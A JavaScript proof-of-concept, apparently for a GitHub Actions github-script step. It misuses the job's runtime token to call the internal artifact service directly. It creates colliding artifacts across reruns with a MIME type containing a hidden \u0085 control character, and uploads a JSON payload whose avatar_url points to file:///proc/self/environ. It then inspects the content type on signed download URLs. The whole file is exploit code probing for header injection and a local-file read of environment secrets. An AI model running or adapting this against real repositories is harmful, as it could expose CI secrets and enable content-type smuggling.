module.exports = async function scan({context}) {
  const runtimeToken = process.env.ACTIONS_RUNTIME_TOKEN;
  const resultsUrl = process.env.ACTIONS_RESULTS_URL;
  const claims = JSON.parse(Buffer.from(runtimeToken.split('.')[1], 'base64url').toString('utf8'));
  const scope = claims.scp.split(' ').find(x => x.startsWith('Actions.Results:'));
  const [, runId, jobId] = scope.split(':');
  const ids = {workflow_run_backend_id: runId, workflow_job_run_backend_id: jobId};
  const base = `${new URL(resultsUrl).origin}/twirp/github.actions.results.api.v1.ArtifactService`;
  const name = 'rerun-collision';
  const attempt = Number(process.env.GITHUB_RUN_ATTEMPT);
  const version = attempt === 1 ? 6 : 7;
  const mimeType = attempt === 1 ? 'application/json\u0085' : 'application/json';
  const payload = Buffer.from('{"full_name":"x/y","owner":{"avatar_url":"file:///proc/self/environ"}}');
  async function twirp(method, body) {
    const response = await fetch(`${base}/${method}`, {method: 'POST', headers: {
      'Authorization': `Bearer ${runtimeToken}`, 'Content-Type': 'application/json',
    }, body: JSON.stringify(body)});
    return {status: response.status, data: await response.json().catch(() => ({}))};
  }
  console.log(`Attempt ${attempt}; version=${version}`);
  const created = await twirp('CreateArtifact', {...ids, name, version, mime_type: mimeType});
  console.log(`Create: HTTP ${created.status}; ok=${Boolean(created.data.ok)}; message=${JSON.stringify(String(created.data.msg || '').slice(0, 130))}`);
  if (created.status === 200 && created.data.ok) {
    const url = created.data.signed_upload_url || created.data.signedUploadUrl;
    const put = await fetch(url, {method: 'PUT', headers: {
      'Content-Type': 'application/octet-stream', 'x-ms-version': '2025-01-05',
      'x-ms-blob-type': 'BlockBlob', 'x-ms-blob-content-type': 'application/json\u0085',
    }, body: payload});
    console.log(`PUT: HTTP ${put.status}`);
    if (put.ok) {
      const finalized = await twirp('FinalizeArtifact', {...ids, name, size: String(payload.length)});
      console.log(`Finalize: HTTP ${finalized.status}; ok=${Boolean(finalized.data.ok)}; id=${String(finalized.data.artifact_id || finalized.data.artifactId || '')}`);
    }
  }
  const list = await fetch(`https://api.github.com/repos/${context.repo.owner}/${context.repo.repo}/actions/runs/${context.runId}/artifacts`, {
    headers: {'Authorization': `Bearer ${process.env.GH_TOKEN}`, 'Accept': 'application/vnd.github.v3+json'},
  });
  const listData = await list.json().catch(() => ({}));
  console.log(`List: HTTP ${list.status}; same-name-count=${(listData.artifacts || []).filter(a => a.name === name).length}`);
  for (const item of (listData.artifacts || []).filter(a => a.name === name)) {
    const response = await fetch(`https://api.github.com/repos/${context.repo.owner}/${context.repo.repo}/actions/artifacts/${item.id}/zip`, {
      redirect: 'manual', headers: {'Authorization': `Bearer ${process.env.GH_TOKEN}`, 'Accept': 'application/vnd.github.v3+json'},
    });
    const location = response.headers.get('location');
    console.log(`Artifact ${item.id}: HTTP ${response.status}; rsct=${JSON.stringify(location ? new URL(location).searchParams.get('rsct') : null)}`);
  }
};
